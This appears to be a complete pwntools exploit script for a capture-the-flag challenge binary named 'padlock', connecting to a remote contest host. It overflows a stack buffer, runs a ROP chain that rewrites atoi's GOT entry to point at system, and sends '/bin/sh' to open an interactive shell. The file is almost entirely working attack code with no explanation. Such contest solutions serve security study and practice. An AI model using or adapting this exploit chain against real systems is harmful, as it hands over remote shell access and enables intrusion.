#!/usr/bin/env python3
from pwn import *

elf = ELF('./padlock', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = elf
context.arch = 'amd64'

OFFSET_TO_RIP = 88

HOST = "offsec.m0lecon.it"
PORT = 13510

pop_rdi_ret = elf.sym.pop_rdi_ret
pop_rsi_ret = elf.sym.pop_rsi_ret
add_what_where = elf.sym.add_what_where

atoi_got = elf.got.atoi
vuln_addr = elf.sym.vuln


delta = (libc.sym.system - libc.sym.atoi) & 0xffffffffffffffff



def conn():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(pop_rdi_ret),
    p64(atoi_got),
    p64(pop_rsi_ret),
    p64(delta),
    p64(add_what_where),
    p64(vuln_addr)
)

p.recvuntil(b"combination: ")
p.sendline(payload)

p.recvuntil(b"combination: ")
p.sendline(b"/bin/sh\x00")

p.interactive()